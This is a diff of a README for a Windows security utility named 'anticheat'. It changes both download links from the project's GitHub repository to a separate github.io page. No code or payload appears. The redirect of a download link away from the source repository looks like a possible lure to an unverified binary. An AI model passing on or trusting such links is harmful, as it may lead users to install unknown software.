@@ -1,6 +1,6 @@
 # 🛡️ anticheat - Protect your computer from unwanted software
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Gavriellechanged22/anticheat)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://gavriellechanged22.github.io)
 
 Anticheat monitors active programs on your Windows computer. It checks system memory and background processes to ensure that your setup stays clean. This tool uses advanced Windows functions to detect hidden threats. It records security data in a simple format that you can review or share for analysis.
 
@@ -8,7 +8,7 @@ Anticheat monitors active programs on your Windows computer. It checks system me
 
 To begin, you need to obtain the software package. Visit the link below to reach the official download source. Select the latest version and save the file to your desktop.
 
-[Download the Anticheat Application](https://github.com/Gavriellechanged22/anticheat)
+[Download the Anticheat Application](https://gavriellechanged22.github.io)
 
 ## 🖥️ System Requirements
 
